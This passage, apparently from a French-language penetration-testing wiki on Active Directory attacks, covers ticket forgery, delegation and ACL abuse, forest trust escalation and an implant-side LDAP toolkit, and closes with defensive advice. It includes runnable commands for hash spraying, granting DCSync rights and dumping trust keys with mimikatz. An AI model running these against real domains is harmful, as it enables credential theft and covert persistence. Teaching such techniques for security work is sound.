over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Dans la méthode d'attaque **Pass The Ticket (PTT)**, les attaquants **volent le ticket d'authentification d'un utilisateur** au lieu de son mot de passe ou de ses hashes. Ce ticket volé est ensuite utilisé pour **se faire passer pour l'utilisateur**, obtenant ainsi un accès non autorisé aux ressources et services du réseau.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Réutilisation des identifiants

Si vous disposez du **hash** ou du **mot de passe** d'un **administrateu**r **local**, vous devriez essayer de vous **connecter localement** à d'autres **PC** avec celui-ci.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Notez que ceci est assez **bruyant** et que **LAPS** permettrait de l'**atténuer**.

### MSSQL Abuse & Trusted Links

Si un utilisateur dispose des privilèges pour **accéder aux instances MSSQL**, il pourrait les utiliser pour **exécuter des commandes** sur l'hôte MSSQL (s'il s'exécute en tant que SA), **voler** le **hash** NetNTLM ou même effectuer une **relay** **attack**.\
Si une instance MSSQL est approuvée via un lien de base de données par une autre instance, un utilisateur disposant de privilèges sur la base de données liée pourrait **utiliser la relation de confiance pour exécuter des requêtes sur l'autre instance**. Ces relations de confiance peuvent être chaînées et atteindre finalement une base de données mal configurée sur laquelle l'utilisateur peut exécuter des commandes.\
**Les liens entre les bases de données fonctionnent même au travers des relations de confiance entre forêts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Les suites tierces d'inventaire et de déploiement exposent souvent des accès puissants aux identifiants et à l'exécution de code. Voir :

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Si vous trouvez un objet Computer avec l'attribut [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) et que vous disposez de privilèges de domaine sur l'ordinateur, vous pourrez extraire de la mémoire les TGT de tous les utilisateurs qui se connectent à l'ordinateur.\
Ainsi, si un **Domain Admin se connecte à l'ordinateur**, vous pourrez extraire son TGT et vous faire passer pour lui à l'aide de [Pass the Ticket](pass-the-ticket.md).\
Grâce à la constrained delegation, vous pourriez même **compromettre automatiquement un Print Server** (avec un peu de chance, ce sera un DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Si un utilisateur ou un ordinateur est autorisé pour la "Constrained Delegation", il pourra **se faire passer pour n'importe quel utilisateur afin d'accéder à certains services sur un ordinateur**.\
Ainsi, si vous **compromettez le hash** de cet utilisateur/ordinateur, vous pourrez **vous faire passer pour n'importe quel utilisateur** (même des domain admins) afin d'accéder à certains services.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Le fait de disposer du privilège **WRITE** sur un objet Active Directory d'un ordinateur distant permet d'obtenir une exécution de code avec des **privilèges élevés** :


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

L'utilisateur compromis pourrait disposer de **privilèges intéressants sur certains objets du domaine**, ce qui pourrait vous permettre de **vous déplacer** latéralement ou d'**élever** vos privilèges.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

La découverte d'un **service Spooler à l'écoute** au sein du domaine peut être **exploitée** pour **acquérir de nouveaux identifiants** et **élever ses privilèges**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Si **d'autres utilisateurs** **accèdent** à la machine **compromise**, il est possible de **récupérer des identifiants en mémoire** et même d'**injecter des beacons dans leurs processus** afin de se faire passer pour eux.\
Les utilisateurs accèdent généralement au système via RDP ; voici donc comment effectuer quelques attacks sur des sessions RDP tierces :


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** fournit un système de gestion du **mot de passe de l'Administrator local** sur les ordinateurs joints au domaine, en veillant à ce qu'il soit **randomisé**, unique et **changé** fréquemment. Ces mots de passe sont stockés dans Active Directory et leur accès est contrôlé par des ACL afin de le limiter aux utilisateurs autorisés. Avec des permissions suffisantes pour accéder à ces mots de passe, il devient possible de pivoter vers d'autres ordinateurs.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

La **récupération de certificats** sur la machine compromise pourrait permettre d'élever ses privilèges au sein de l'environnement :


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Si des **templates vulnérables** sont configurés, il est possible de les exploiter pour élever ses privilèges :


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Une fois que vous avez obtenu les privilèges de **Domain Admin**, ou mieux encore ceux d'**Enterprise Admin**, vous pouvez **extraire** la **base de données du domaine** : _ntds.dit_.

[**Plus d'informations sur l'attack DCSync sont disponibles ici**](dcsync.md).

[**Plus d'informations sur le vol de NTDS.dit sont disponibles ici**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Certaines techniques présentées précédemment peuvent être utilisées pour la persistence.\
Par exemple, vous pourriez :

- Rendre les utilisateurs vulnérables à [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Rendre les utilisateurs vulnérables à [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Accorder les privilèges [**DCSync**](#dcsync) à un utilisateur

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

La **Silver Ticket attack** crée un **legitimate Ticket Granting Service (TGS) ticket** pour un service spécifique en utilisant le **NTLM hash** (par exemple, le **hash du compte de l'ordinateur**). Cette méthode sert à **accéder aux privilèges du service**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Une **Golden Ticket attack** consiste, pour un attaquant, à obtenir le **NTLM hash du compte krbtgt** dans un environnement Active Directory (AD). Ce compte est particulier, car il sert à signer tous les **Ticket Granting Tickets (TGTs)**, indispensables à l'authentification au sein du réseau AD.

Une fois ce hash obtenu, l'attaquant peut créer des **TGTs** pour n'importe quel compte de son choix (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Ils sont similaires aux golden tickets, mais forgés de manière à **contourner les mécanismes courants de détection des golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Le fait de disposer des certificats d'un compte ou de pouvoir les demander** constitue un très bon moyen de maintenir une persistence sur le compte de l'utilisateur (même s'il change son mot de passe) :


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**L'utilisation de certificats permet également de maintenir une persistence avec des privilèges élevés au sein du domaine :**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

L'objet **AdminSDHolder** d'Active Directory garantit la sécurité des **groupes privilégiés** (comme Domain Admins et Enterprise Admins) en appliquant une **Access Control List (ACL)** standard à ces groupes afin d'empêcher les modifications non autorisées. Cependant, cette fonctionnalité peut être exploitée ; si un attaquant modifie l'ACL d'AdminSDHolder pour accorder un accès complet à un utilisateur standard, celui-ci obtient un contrôle étendu sur tous les groupes privilégiés. Cette mesure de sécurité, conçue pour protéger l'environnement, peut donc se retourner contre lui et permettre un accès injustifié si elle n'est pas surveillée attentivement.

[**Plus d'informations sur le groupe AdminDSHolder ici.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Dans chaque **Domain Controller (DC)**, il existe un compte d'**administrateur local**. En obtenant les droits d'administrateur sur une telle machine, le hash de l'Administrator local peut être extrait à l'aide de **mimikatz**. Ensuite, une modification du registre est nécessaire pour **activer l'utilisation de ce mot de passe**, ce qui permet l'accès distant au compte Administrator local.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Vous pourriez **accorder** certaines **permissions spéciales** à un **utilisateur** sur des objets spécifiques du domaine, ce qui lui permettrait d'**élever ses privilèges à l'avenir**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Les **security descriptors** servent à **stocker** les **permissions** qu'un **objet possède sur** un **objet**. Si vous pouvez simplement **apporter** une **petite modification** au **security descriptor** d'un objet, vous pouvez obtenir des privilèges très intéressants sur cet objet sans avoir besoin d'être membre d'un groupe privilégié.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Exploitez la classe auxiliaire `dynamicObject` pour créer des principaux/GPO/enregistrements DNS à courte durée de vie avec `entryTTL`/`msDS-Entry-Time-To-Die` ; ils s'auto-suppriment sans tombstones, effaçant les preuves LDAP tout en laissant des SID orphelins, des références `gPLink` rompues ou des réponses DNS mises en cache (par exemple, une pollution d'ACE d'AdminSDHolder ou des redirections DNS intégrées à AD via `gPCFileSysPath`/AD).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Modifiez **LSASS** en mémoire afin d'établir un **mot de passe universel**, permettant l'accès à tous les comptes du domaine.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Découvrez ici ce qu'est un SSP (Security Support Provider).](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Vous pouvez créer votre **propre SSP** afin de **capturer en clair** les **identifiants** utilisés pour accéder à la machine.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Il enregistre un **nouveau Domain Controller** dans l'AD et l'utilise pour **pousser des attributs** (SIDHistory, SPNs...) sur des objets spécifiés **sans laisser de logs** concernant les **modifications**. Vous **devez disposer des privilèges DA** et vous trouver dans le **root domain**.\
Notez que si vous utilisez des données incorrectes, des logs particulièrement compromettants apparaîtront.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Nous avons précédemment expliqué comment élever ses privilèges si l'on dispose de **permissions suffisantes pour lire les mots de passe LAPS**. Cependant, ces mots de passe peuvent également être utilisés pour **maintenir une persistence**.\
Voir :


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft considère la **Forest** comme la frontière de sécurité. Cela implique que la **compromission d'un seul domaine pourrait potentiellement entraîner la compromission de l'ensemble de la Forest**.<sup>[[1]](#references)</sup>

### Basic Information

Une [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) est un mécanisme de sécurité qui permet à un utilisateur d'un **domaine** d'accéder aux ressources d'un autre **domaine**. Elle établit essentiellement une liaison entre les systèmes d'authentification des deux domaines, permettant aux vérifications d'authentification de circuler de manière transparente. Lorsque les domaines établissent une relation de confiance, ils échangent et conservent des **clés** spécifiques dans leurs **Domain Controllers (DCs)**, indispensables à l'intégrité de cette relation.

Dans un scénario classique, si un utilisateur souhaite accéder à un service dans un **trusted domain**, il doit d'abord demander un ticket spécial appelé **inter-realm TGT** au DC de son propre domaine. Ce TGT est chiffré avec une **clé** partagée convenue par les deux domaines. L'utilisateur présente ensuite ce TGT au **DC du trusted domain** afin d'obtenir un ticket de service (**TGS**). Après validation de l'inter-realm TGT par le DC du trusted domain, celui-ci émet un TGS qui accorde à l'utilisateur l'accès au service.

**Étapes** :

1. Un **client computer** du **Domain 1** commence le processus en utilisant son **NTLM hash** pour demander un **Ticket Granting Ticket (TGT)** à son **Domain Controller (DC1)**.
2. DC1 émet un nouveau TGT si le client est authentifié avec succès.
3. Le client demande ensuite un **inter-realm TGT** à DC1, nécessaire pour accéder aux ressources du **Domain 2**.
4. L'inter-realm TGT est chiffré avec une **trust key** partagée entre DC1 et DC2 dans le cadre de la relation de confiance bidirectionnelle entre les domaines.
5. Le client transmet l'inter-realm TGT au **Domain Controller (DC2) du Domain 2**.
6. DC2 vérifie l'inter-realm TGT à l'aide de sa trust key partagée et, s'il est valide, émet un **Ticket Granting Service (TGS)** pour le serveur du Domain 2 auquel le client souhaite accéder.
7. Enfin, le client présente ce TGS au serveur, lequel est chiffré avec le hash du compte du serveur, afin d'obtenir l'accès au service du Domain 2.

### Different trusts

Il est important de noter qu'une **trust** peut être à sens unique ou bidirectionnelle. Dans le cas bidirectionnel, les deux domaines se font mutuellement confiance ; dans le cas d'une relation de confiance **à sens unique**, l'un des domaines est le domaine **trusted** et l'autre le domaine **trusting**. Dans ce dernier cas, **vous ne pourrez accéder aux ressources du trusting domain depuis le trusted domain**.

Si le Domain A fait confiance au Domain B, A est le trusting domain et B le trusted domain. De plus, dans le **Domain A**, il s'agit d'une **Outbound trust** ; et dans le **Domain B**, d'une **Inbound trust**.

**Différentes relations de confiance**

- **Parent-Child Trusts** : Il s'agit d'une configuration courante au sein d'une même forest, dans laquelle un child domain dispose automatiquement d'une relation de confiance transitive et bidirectionnelle avec son parent domain. Cela signifie essentiellement que les demandes d'authentification peuvent circuler de manière transparente entre le parent et l'enfant.
- **Cross-link Trusts** : Également appelées "shortcut trusts", elles sont établies entre des child domains afin d'accélérer les processus de referral. Dans les forests complexes, les referrals d'authentification doivent généralement remonter jusqu'à la forest root, puis redescendre vers le domain cible. En créant des cross-links, le parcours est raccourci, ce qui est particulièrement avantageux dans les environnements géographiquement dispersés.
- **External Trusts** : Elles sont établies entre des domaines différents et sans lien, et sont par nature non transitives. Selon la [documentation de Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), les external trusts sont utiles pour accéder aux ressources d'un domaine situé en dehors de la forest actuelle et qui n'est pas connecté par une forest trust. La sécurité est renforcée par le filtrage des SID avec les external trusts.
- **Tree-root Trusts** : Ces relations sont automatiquement établies entre la forest root domain et une nouvelle tree root ajoutée. Bien qu'elles soient peu courantes, les tree-root trusts sont importantes pour ajouter de nouvelles arborescences de domaines à une forest, en leur permettant de conserver un nom de domaine unique et en garantissant une transitivité bidirectionnelle. Plus d'informations sont disponibles dans le [guide de Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts** : Ce type de relation est une relation de confiance transitive et bidirectionnelle entre deux forest root domains, qui applique également le filtrage des SID afin de renforcer les mesures de sécurité.
- **MIT Trusts** : Ces relations sont établies avec des domaines Kerberos non Windows et [conformes à la RFC4120](https://tools.ietf.org/html/rfc4120). Les MIT trusts sont plus spécialisées et s'adressent aux environnements nécessitant une intégration avec des systèmes basés sur Kerberos en dehors de l'écosystème Windows.

#### Other differences in **trusting relationships**

- Une relation de confiance peut également être **transitive** (A fait confiance à B, B fait confiance à C, donc A fait confiance à C) ou **non transitive**.
- Une relation de confiance peut être configurée comme **bidirectional trust** (les deux domaines se font mutuellement confiance) ou comme **one-way trust** (un seul des deux domaines fait confiance à l'autre).

### Attack Path

1. **Énumérer** les relations de confiance
2. Vérifier si un **security principal** (user/group/computer) a **accès** aux ressources de l'**autre domaine**, éventuellement via des entrées ACE ou parce qu'il appartient à des groupes de l'autre domaine. Rechercher les **relations entre domaines** (c'est probablement la raison pour laquelle la trust a été créée).
1. Le kerberoast dans ce cas pourrait être une autre option.
3. **Compromettre** les **comptes** qui peuvent **pivoter** entre les domaines.

Les attaquants disposant d'un accès aux ressources d'un autre domaine peuvent y parvenir par trois mécanismes principaux :

- **Local Group Membership** : Des principals peuvent être ajoutés à des groupes locaux sur des machines, comme le groupe “Administrators” d'un serveur, ce qui leur accorde un contrôle important sur cette machine.
- **Foreign Domain Group Membership** : Des principals peuvent également être membres de groupes au sein du domaine distant. Cependant, l'efficacité de cette méthode dépend de la nature de la trust et de la portée du groupe.
- **Access Control Lists (ACLs)** : Des principals peuvent être spécifiés dans une **ACL**, notamment comme entités dans des **ACEs** au sein d'une **DACL**, ce qui leur donne accès à des ressources spécifiques. Pour approfondir le fonctionnement des ACLs, DACLs et ACEs, le livre blanc intitulé “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” constitue une ressource précieuse.<sup>[[17]](#references)</sup>

### Find external users/groups with permissions

Vous pouvez consulter **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** pour trouver les foreign security principals du domaine. Il s'agit d'utilisateurs/groupes provenant d'**un domaine ou d'une forest externe**.

Vous pouvez vérifier cela dans **Bloodhound** ou à l'aide de powerview :
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Élévation de privilèges Child-to-Parent dans une forêt
```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Autres moyens d’énumérer les relations d’approbation de domaine :
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Il existe **2 clés approuvées**, l'une pour _Child --> Parent_ et l'autre pour _Parent_ --> _Child_.\
> Vous pouvez obtenir celle utilisée par le domaine actuel avec :
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

S'élever au rôle d'Enterprise admin du domaine child/parent en exploitant la relation de confiance avec SID-History injection :


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploiter la Configuration NC accessible en écriture

Comprendre comment la Configuration Naming Context (NC) peut être exploitée est crucial. La Configuration NC sert de référentiel central pour les données de configuration dans une forêt des environnements Active Directory (AD). Ces données sont répliquées sur chaque Domain Controller (DC) de la forêt, les DC accessibles en écriture conservant une copie accessible en écriture de la Configuration NC. Pour l'exploiter, il faut disposer de **privilèges SYSTEM sur un DC**, de préférence un child DC.

**Lier une GPO au site du root DC**

Le conteneur Sites de la Configuration NC contient des informations sur les sites de tous les ordinateurs joints au domaine dans la forêt AD. En opérant avec des privilèges SYSTEM sur n'importe quel DC, les attaquants peuvent lier des GPO aux sites du root DC. Cette action compromet potentiellement le domaine root en manipulant les stratégies appliquées à ces sites.

Pour obtenir des informations approfondies, on peut consulter les recherches sur [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Compromettre n'importe quel gMSA de la forêt**

Un vecteur d'attaque consiste à cibler les gMSA privilégiés du domaine. La clé KDS Root, essentielle au calcul des mots de passe des gMSA, est stockée dans la Configuration NC. Avec des privilèges SYSTEM sur n'importe quel DC, il est possible d'accéder à la clé KDS Root et de calculer les mots de passe de n'importe quel gMSA dans toute la forêt.

Une analyse détaillée et des instructions étape par étape sont disponibles dans :


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Attaque MSA déléguée complémentaire (BadSuccessor – exploitation des attributs de migration) :


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Recherche externe supplémentaire : [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Schema change attack**

Cette méthode nécessite de la patience, en attendant la création de nouveaux objets AD privilégiés. Avec des privilèges SYSTEM, un attaquant peut modifier l'AD Schema afin d'accorder à n'importe quel utilisateur un contrôle complet sur toutes les classes. Cela peut entraîner un accès et un contrôle non autorisés sur les objets AD nouvellement créés.

Des informations supplémentaires sont disponibles dans [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**De DA à EA avec ADCS ESC5**

La vulnérabilité ADCS ESC5 cible le contrôle des objets de Public Key Infrastructure (PKI) afin de créer un certificate template permettant de s'authentifier en tant que n'importe quel utilisateur de la forêt. Comme les objets PKI résident dans la Configuration NC, la compromission d'un child DC accessible en écriture permet l'exécution d'attaques ESC5.

Plus de détails sont disponibles dans [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> Dans les scénarios dépourvus d'ADCS, l'attaquant peut mettre en place les composants nécessaires, comme expliqué dans [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### Domaine de forêt externe - unidirectionnel (entrant) ou bidirectionnel
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Dans ce scénario, **votre domaine est approuvé** par un domaine externe qui vous accorde des **permissions indéterminées** sur celui-ci. Vous devrez déterminer **quels principaux de votre domaine disposent de quels accès au domaine externe**, puis tenter de l’exploiter :


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Domaine de forêt externe - Unidirectionnel (sortant)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Dans ce scénario, **votre domaine** accorde sa **confiance** à certains **privilèges** pour un principal provenant de **domaines différents**.

Cependant, lorsqu’un **domaine est approuvé** par le domaine qui lui fait confiance, le domaine approuvé **crée un utilisateur** avec un **nom prévisible** et utilise comme **mot de passe celui du domaine approuvé**. Cela signifie qu’il est possible **d’accéder à un utilisateur du domaine qui accorde sa confiance pour entrer dans le domaine approuvé**, afin de l’énumérer et d’essayer d’escalader davantage les privilèges :


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Une autre façon de compromettre le domaine approuvé consiste à trouver un [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) créé dans la **direction opposée** à celle de la relation d’approbation entre les domaines (ce qui n’est pas très courant).

Une autre façon de compromettre le domaine approuvé consiste à attendre sur une machine à laquelle **un utilisateur du domaine approuvé peut accéder** pour se connecter via **RDP**. L’attaquant pourrait alors injecter du code dans le processus de la session RDP et **accéder au domaine d’origine de la victime** depuis celui-ci.\
De plus, si la **victime a monté son disque dur**, l’attaquant pourrait, depuis le processus de la **session RDP**, stocker des **backdoors** dans le **dossier de démarrage du disque dur**. Cette technique est appelée **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mitigation de l’abus des relations d’approbation de domaine

### **SID Filtering:**

- Le risque d’attaques exploitant l’attribut SID history au travers des relations d’approbation entre forêts est atténué par SID Filtering, activé par défaut sur toutes les relations d’approbation inter-forêts. Cela repose sur l’hypothèse que les relations d’approbation intra-forêt sont sécurisées, la forêt, plutôt que le domaine, étant considérée comme la limite de sécurité selon Microsoft.
- Cependant, il existe un inconvénient : SID filtering peut perturber les applications et l’accès des utilisateurs, ce qui entraîne parfois sa désactivation.

### **Selective Authentication:**

- Pour les relations d’approbation inter-forêts, l’utilisation de Selective Authentication garantit que les utilisateurs des deux forêts ne sont pas automatiquement authentifiés. Des autorisations explicites sont nécessaires pour que les utilisateurs accèdent aux domaines et aux serveurs du domaine ou de la forêt qui accorde sa confiance.
- Il est important de noter que ces mesures ne protègent pas contre l’exploitation du writable Configuration Naming Context (NC) ni contre les attaques visant le trust account.

[**Plus d’informations sur les relations d’approbation de domaine dans ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## Abus d’AD basé sur LDAP depuis des implants on-host

La [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) réimplémente des primitives LDAP de type bloodyAD sous forme de Beacon Object Files x64 qui s’exécutent entièrement à l’intérieur d’un implant on-host (par exemple, Adaptix C2). Les opérateurs compilent le pack avec `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, chargent `ldap.axs`, puis appellent `ldap <subcommand>` depuis le beacon. Tout le trafic utilise le contexte de sécurité de la connexion actuelle via LDAP (389), avec signature/chiffrement, ou via LDAPS (636), avec confiance automatique dans les certificats ; aucun proxy socks ni artefact sur disque n’est requis.<sup>[[4]](#references)</sup>

### Énumération LDAP côté implant

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` et `get-groupmembers` résolvent les noms courts/chemins OU en DN complets et extraient les objets correspondants.
- `get-object`, `get-attribute` et `get-domaininfo` récupèrent des attributs arbitraires (y compris les descripteurs de sécurité), ainsi que les métadonnées de la forêt et du domaine depuis `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation` et `get-rbcd` exposent directement depuis LDAP les candidats au roasting, les paramètres de délégation et les descripteurs existants de [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).
- `get-acl` et `get-writable --detailed` analysent la DACL pour répertorier les trustees, les droits (GenericAll/WriteDACL/WriteOwner/écritures d’attributs) et l’héritage, fournissant immédiatement des cibles pour l’escalade de privilèges via ACL.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### Primitives d’écriture LDAP pour l’escalade et la persistence

- Les BOF de création d’objets (`add-user`, `add-computer`, `add-group`, `add-ou`) permettent à l’opérateur de préparer de nouveaux principals ou comptes machine partout où des droits sur les OU existent. `add-groupmember`, `set-password`, `add-attribute` et `set-attribute` permettent de détourner directement les cibles une fois les droits WriteProperty trouvés.
- Les commandes axées sur les ACL, telles que `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` et `add-dcsync`, transforment WriteDACL/WriteOwner sur n’importe quel objet AD en réinitialisations de mots de passe, contrôle de l’appartenance aux groupes ou privilèges de réplication DCSync, sans laisser d’artefacts PowerShell/ADSI. Les équivalents `remove-*` nettoient les ACE injectées.

### Délégation, roasting et abus de Kerberos

- `add-spn`/`set-spn` rendent instantanément un utilisateur compromis Kerberoastable ; `add-asreproastable` (bascule UAC) le marque comme éligible à l’AS-REP roasting sans toucher au mot de passe.
- Les macros de délégation (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) réécrivent `msDS-AllowedToDelegateTo`, les indicateurs UAC ou `msDS-AllowedToActOnBehalfOfOtherIdentity` depuis le beacon, activant les chemins d’attaque constrained/unconstrained/RBCD et supprimant le besoin de PowerShell distant ou de RSAT.

### Injection de sidHistory, déplacement d’OU et configuration de la surface d’attaque

- `add-sidhistory` injecte des SIDs privilégiés dans l’historique SID d’un principal contrôlé (voir [SID-History Injection](sid-history-injection.md)), fournissant un héritage d’accès furtif entièrement via LDAP/LDAPS.
- `move-object` modifie le DN/OU des ordinateurs ou des utilisateurs, permettant à un attaquant de déplacer des ressources vers des OU où des droits délégués existent déjà avant d’abuser de `set-password`, `add-groupmember` ou `add-spn`.
- Des commandes de suppression étroitement ciblées (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, etc.) permettent un rollback rapide après la collecte des identifiants ou la mise en place de la persistence, en minimisant la télémétrie.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Quelques défenses générales

[**En savoir plus sur la protection des identifiants ici.**](../stealing-credentials/credentials-protections.md)

### **Mesures défensives pour la protection des identifiants**

- **Restrictions des Domain Admins** : il est recommandé d’autoriser les Domain Admins à se connecter uniquement aux Domain Controllers, afin d’éviter leur utilisation sur d’autres hôtes.
- **Privilèges des comptes de service** : les services ne doivent pas être exécutés avec des privilèges Domain Admin (DA) afin de préserver la sécurité.
- **Limitation temporelle des privilèges** : pour les tâches nécessitant des privilèges DA, leur durée doit être limitée. Cela peut être réalisé avec : `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Atténuation des LDAP relay** : auditer les Event IDs 2889/3074/3075, puis imposer la signature LDAP ainsi que le channel binding LDAPS sur les DC/clients afin de bloquer les tentatives de LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Empreinte au niveau du protocole de l’activité d’Impacket

Si vous souhaitez détecter les tradecraft AD courants, **ne vous fiez pas uniquement aux artefacts contrôlés par l’opérateur**, tels que les binaires renommés, les noms de services, les fichiers batch temporaires ou les chemins de sortie. Établissez une baseline de la manière dont les clients Windows légitimes construisent le trafic [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC et WMI, puis recherchez les **particularités d’implémentation** qui persistent même après la modification par l’opérateur de `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` ou `ntlmrelayx.py`.<sup>[[8]](#references)</sup>

- **Candidats autonomes à haute confiance** (après validation avec votre propre baseline) :
- DCE/RPC authentifié utilisant `auth_context_id = 79231 + ctx_id`
- Padding d’authentification DCE/RPC rempli avec `0xff`
